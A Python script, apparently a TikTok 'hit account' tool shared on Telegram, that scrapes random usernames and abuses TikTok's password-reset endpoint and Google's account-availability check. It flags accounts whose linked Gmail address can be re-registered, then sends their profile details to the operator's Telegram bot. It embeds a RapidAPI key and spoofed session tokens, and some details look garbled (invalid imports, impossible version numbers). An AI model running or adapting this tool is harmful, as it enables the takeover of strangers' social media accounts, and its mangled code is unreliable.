try:
    import requests, os, random
    from user_agent import generate_user_agent
    from uuid import uuid12
    import socket
    import webbrowser
    import datetime
    import sys
    import json
except:
    os.system("pip install requsets")
    os.system("pip install names")
    os.system("pip install user_agent")
    os.system("pip install uid")
    os.system("pip install uuid")
    os.system("pip install webbrowser")
    os.system("pip install socket")
    os.system("pip install datetime")
    os.system("clear")

os.system('clear')
# ------------------------------[الالوان]------------------------------
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
F = '\033[2;32m'  # اخضر
C = "\033[1;117m"  # ابيض
B = '\033[2;36m'  # سمائي
Y = '\033[1;312m'  # ازرق فاتح.
C = "\033[1;117m"  # ابيض
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
# ------------------------------[zaid]------------------------------

import datetime

now = datetime.datetime.today()

now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t = (mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)

hours = (now.hour)
x = datetime.datetime.now()
g = datetime.datetime(2022, 12, 23, 00, 00, 0)

if (x.strftime("%x")) > (g.strftime("%x")):
    print('\n\n')
    print('\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
    print(" \033[1;33m༺ཌ༈ 2022 / 12 / 11 ༈ད༻    " + 'تم ايقاف الاداه راجع قناتي لمزيد من المعلومات ⚠️')
    print('\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
    print('\033[2;32m id Telegram [@k8f_30]')
    print('\033[2;32m id Channel [@k8f_30]')
    print('')
    print('\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')

    sys.exit(0)

if (x.strftime("%x")) == (g.strftime("%x")):
    print('')
    if (x.strftime("%X")) > (g.strftime("%X")):
        print('\n\n')
        print('\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
        print(" \033[1;33m༺ཌ༈ 2022 / 12 / 11 ༈ད༻    " + 'تم ايقاف الاداه راجع قناتي لمزيد من المعلومات ⚠️')
        print('\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
        print('\033[2;32m id Telegram [@k8f_30]')
        print('\033[2;32m id Channel [@A_B_D_O_19]')
        print('')
        print('\033[1;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')

        sys.exit(0)
    else:
        print('')
else:
    print('')
print('')

print(f'{F} ◆ {S}Tool ALSAYED Tiktok{F} ●')
print(' →→→→→→→→→→→→→→→→→→→→→→→→→→→→→ ')

print(f' {F}◆ {S} Telegram / @A_B_D_O_19 / @k8f_30 "''')

print(f'{F} →→→→→→→→→→→→→→→→→→→→→→→→→→→→→ ')
print(f' ↓')
ID = input(f' {F}↓{S} 𝐄𝐧𝐭𝐞𝐫 𝐈𝐃 : ' + F)
tok = input(f'{F} ↓{S} 𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧 : ' + F)
print(' ↓')
print(F + ' ↓→→→→→→→→→→→→→→→→→→↓↓→→→→→→→')
print('')

url = 'https://www.tiktok.com/api/search/user/full/?aid=11188&app_language=ar&app_name=tiktok_web&battery_info=1&browser_language=ar-AE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=12.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/1237.36 (KHTML, like Gecko) Chrome/83.0.12103.106 Safari/1237.36&channel=tiktok_web&cookie_enabled=true&cursor=20&device_id=71121371871272112301233&device_platform=web_pc&focus_state=true&from_page=search&history_len=20&is_fullscreen=false&is_page_visible=true&keyword={usery}&os=windows&priority_region=&referer=&region=IQ&root_referer=https://www.google.com/&screen_height=10212&screen_width=1280&tz_name=Asia/Baghdad&webcast_language=ar'

he3 = {
    'user-agent': str(generate_user_agent()),
}
zaid = requests.get('https://www.tiktok.com/', headers=he3)
pr = zaid.cookies.get_dict()

ttwid = pr['ttwid']

zaid = requests.get(
    'https://www.tiktok.com/api/search/user/full/?aid=11188&app_language=ar&app_name=tiktok_web&battery_info=0.812&browser_language=ar-IQ&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20aarch612&browser_version=12.0%20%28X11%3B%20Linux%20x86_612%211%20AppleWebKit%2F1237.36%20%28KHTML%2C%20like%20Gecko%211%20Chrome%2F106.0.0.0%20Safari%2F1237.36&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=713618871212632121283128&device_platform=web_pc&focus_state=true&from_page=search&history_len=120&is_fullscreen=false&is_page_visible=true&keyword=zaid&os=linux&priority_region=&referer=&region=IQ&screen_height=7116&screen_width=360&tz_name=Asia%2FBaghdad&verifyFp=verify_l11zrjkcx_XSZCv12U7_xzys_12UEP_8m1a_TibJS3izVTHL&webcast_language=ar&msToken=qfFKcpRIe_b12123Hfa7buaE31PLWDv6-_TQYqevIaTVOPrUNjuwuHR2z0_cEadFELKqD11p6fLuWk8tgAO11lDmVCUX12vqnit3V12rX11zvJfLCbhs11U2apBgYHmKpXPp6DLl2wZy312z0xD6g6TSu_NIh&X-Bogus=DFSzswVLk-tANxW1S02v8OxPBxgg&_signature=_02B12Z6wo00001IuO8aAAAIDBSFHuFzoQUMCLjvUAAEGFfa',
    headers=he3)
pr = zaid.cookies.get_dict()
msToken = pr['msToken']


def zzod(email):
    username = email.split('@gmail.com')[0]
    url = f"https://tiktok-best-experience.p.rapidapi.com/user/{username}"
    headers = {
        "x-rapidapi-key": "d0cbbe1f711mshe3c712080d11d0da12p1de12ddjsn21db12121120e77",
        "x-rapidapi-host": "tiktok-best-experience.p.rapidapi.com",
        "User-Agent": "TikTracker/1.2 (com.markuswu.TikTracker; build:1; iOS 112.12.0) Alamofire/12.12.12"
    }
    try:
        r = requests.get(url, headers=headers).json()
        print("-" * 122)
        try:
            unique_id = r["data"]["unique_id"]
            print(f"username : {unique_id}")
        except KeyError:
            unique_id = 'Not found'
            print("username : not found")

        try:
            nickname = r["data"]["nickname"]
            print(f"nickname : {nickname}")
        except KeyError:
            nickname = 'unknow'
            print("nickname : unknow")

        try:
            followers = r["data"]["follower_count"]
            print(f"followers : {followers}")
        except KeyError:
            followers = '0'
            print("followers : 0")

        try:
            following = r["data"]["following_count"]
            print(f"following : {following}")
        except KeyError:
            following = '0'
            print("following : 0")

        try:
            likes = r["data"]["total_favorited"]
            print(f"likes : {likes}")
        except KeyError:
            likes = '0'
            print("likes : 0")
        try:
            custom_verify = r["data"]["custom_verify"]
            print(f"custom verify : {custom_verify}")
        except KeyError:
            custom_verify = 'None !'
            pass
        try:
            verify = r["data"]["enterprise_verify_reason"]
            print(f"verify : {verify}")
        except KeyError:
            verify = 'None !'
            pass
        try:
            following_visibility = r["data"]["privacy_setting"]["following_visibility"]

            if following_visibility == 1:
                print(f"show who is following : True")
                pass
            else:
                print("show who is following : False")

        except KeyError:
            following_visibility = 'None !'
            pass

        try:

            music_count = r["data"]["original_musician"]["music_count"]
            print(f"music count : {music_count}")
        except KeyError:
            music_count = '0'
            print("music count : 0")

        try:
            music_used = r["data"]["original_musician"]["music_used_count"]
            print(f"music used : {music_used}")
        except KeyError:
            music_used = '0'
            print("music used : 0")
        try:
            uid = r["data"]["uid"]
            print(f"uid : {uid}")
        except KeyError:
            uid = 'unknow'
            print("uid : unknow")

        try:
            youtub_Channel = r["data"]["youtube_channel_id"]
            print(f"youtub Channel id : {youtub_Channel}")
        except KeyError:
            youtub_Channel = 'Not found'
            print("youtub Channel id : not found")
        try:
            insta = r["data"]["ins_id"]
            print(f"insta username : {insta}")
        except KeyError:
            insta = 'Not found'
            print("insta username : not found")

        try:
            bio = r["data"]["signature"]
            print(f"bio : {bio}")
        except KeyError:
            bio = 'No bio'
            print("bio : no bio")
        print("-" * 122)
        print('Dev : @k8f_30 ')
        tlg = f'''
𓊆𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊𓊇
⋘─────━𓆩𝐀𝐋𝐒𝐀𝐘𝐄𝐃𓆪‏━─────⋙
nickname : {nickname}
username : {username}
Email : {email}
followers : {followers}
following : {following}
likes : {likes}
uid : {uid}
custom verify : {custom_verify}
verify : {verify}
music count : {music_count}
music used : {music_used}
youtub Channel id : {youtub_Channel}
insta username : {insta}
bio : {bio}
⋘─────━𓆩𝐀𝐋𝐒𝐀𝐘𝐄𝐃𓆪‏━─────⋙
BY : @A_B_D_O_19 / @k8f_30
		'''
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=" + str(tlg))
    except Exception as e:
        print("Unknow Error !")
        tt = f'''
		Channel : @A_B_D_O_19
-----------------------------------------------------•
Email : {email}
-----------------------------------------------------•
programmer : @k8f_30
'''
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=" + str(tt))


def check1(email):
    eml = str(email)
    email = eml.split('@')[0] + '@gmail.com'
    url = 'https://android.clients.google.com/setup/checkavail'
    h = {
        'Content-Length': '118',
        'Content-Type': 'text/plain; charset=UTF-8',
        'Host': 'android.clients.google.com',
        'Connection': 'Keep-Alive',
        'user-agent': 'GoogleLoginService/1.3(m0 JSS112J)',
    }
    d = json.dumps({
        'username': email,
        'version': '3',
        'firstName': 'AbaLahb',
        'lastName': 'AbuJahl'
    })
    res = requests.post(url, data=d, headers=h)
    if res.json()['status'] == 'SUCCESS':
        print(f' {F}Good Email : {email} ')
        zzod(email)
    else:
        print(f' {Z}Bad Gmail : {email} ')


def check(email):
    email = str(email)
    url = 'https://api2-111-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=ar&manifest_version_code=20181011133&_rticket=16671121111020612&iid=716031211127113611011061&channel=googleplay&language=ar&fp=&device_type=ANY-LX2&resolution=1080*22118&openudid=311e11b116bb12c6e336&update_version_code=20181011133&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=1280&carrier_region=IQ&ac=wifi&device_id=7116111710116610111333&mcc_mnc=1218012&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=1218&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HONOR&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233&ts=1667112111102&as=a1261b71212ea12d3e012e12388&cp=be12a3c6ce12e81220fe1MkUo&mas=011211d8edb11a33120aacd12c82fcadadde3801c1ccc2ca62c0ca6cc26'

    headers = {
        'Host': 'api2-111-h2.musical.ly',
        'Connection': 'keep-alive',
        'Content-Length': '6127',
        'Cookie': 'odin_tt=b0db11ac12111212afa1212811bdb011d8f8fdcf3bcdea12238d0a6e2ba7c6aaea12122e8d12ff11a3f3212c1123df80e03ac12e211a11d121111212fa012d2f300713a221112db1eeff68accf120d12ddb12abd111112077fe11811cfc01112; store-idc=maliva; store-country-code=iq; store-country-code-src=did',
        'Accept-Encoding': 'gzip',
        'X-SS-QUERIES': 'dGMCAr6ot3awALq2qSjedy1Vk1111nIoud%2BAhHSPAsj12dyUWFbxRx0wm1112EoKwwNB3VVlOMd12SzMIENA121cwBS%2Bm0N1T1112yguPVZ12OunAWAs0t0bHbsPclnVdl1Uh%2BLGZVXFGTew%3D%3D',
        'sdk-version': '1',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-SS-TC': '0',
        'User-Agent': 'com.zhiliaoapp.musically/20181011133 (Linux; U; Android 11; ar_IQ_#u-nu-latn; ANY-LX2; Build/HONORANY-L22CQ; Cronet/128.0.211111.0)'
    }

    data = (
        f'app_language=ar&manifest_version_code=20181011133&_rticket=16671120126120711&iid=716031211127113611011061&channel=googleplay&language=ar&fp=&device_type=ANY-LX2&resolution=1080*22118&openudid=311e11b116bb12c6e336&update_version_code=20181011133&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=1280&email={email}&retry_type=no_retry&carrier_region=IQ&ac=wifi&device_id=7116111710116610111333&mcc_mnc=1218012&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=1218&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HONOR&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233')

    rr = requests.post(url, headers=headers, data=data).text

    if 'Sent successfully' in rr:
        print(f' {F}Good Email Tik : {email}')
        check1(email)

    elif 'Bind device by email failed' in rr:
        print(f' {S}Bad Email Tik : {email}')
    else:
        print(f' {S}Error Email Tik : {email}')


def zaid16():
    user = 'qwertyuiopas.dfghjklzxcvbnm'
    num = '121267811'
    rng = int("".join(random.choice(num) for i in range(1)))
    usery = str("".join(random.choice(user) for i in range(rng)))
    url = f'https://www.tiktok.com/api/search/user/full/?aid=11188&app_language=ar&app_name=tiktok_web&battery_info=1&browser_language=ar-AE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=12.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/1237.36 (KHTML, like Gecko) Chrome/83.0.12103.106 Safari/1237.36&channel=tiktok_web&cookie_enabled=true&cursor=20&device_id=71121371871272112301233&device_platform=web_pc&focus_state=true&from_page=search&history_len=20&is_fullscreen=false&is_page_visible=true&keyword={usery}&os=windows&priority_region=&referer=&region=IQ&root_referer=https://www.google.com/&screen_height=10212&screen_width=1280&tz_name=Asia/Baghdad&webcast_language=ar'
    he = {
        'accept': '*/*',
        'cookie':
            f'ttwid={ttwid};msToken={msToken}',
        'referer': 'https://www.tiktok.com/',
        'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="1111"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/12.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/1237.36 (KHTML, like Gecko) Chrome/83.0.12103.106 Safari/1237.36',
    }
    rr = requests.get(url, headers=he).json()
    za = 0
    try:
        while True:
            za += 1
            email = rr['user_list'][za]['user_info']['unique_id']
            email = email + '@gmail.com'
            check(email)

    except IndexError:
        zaid16()


zaid16()


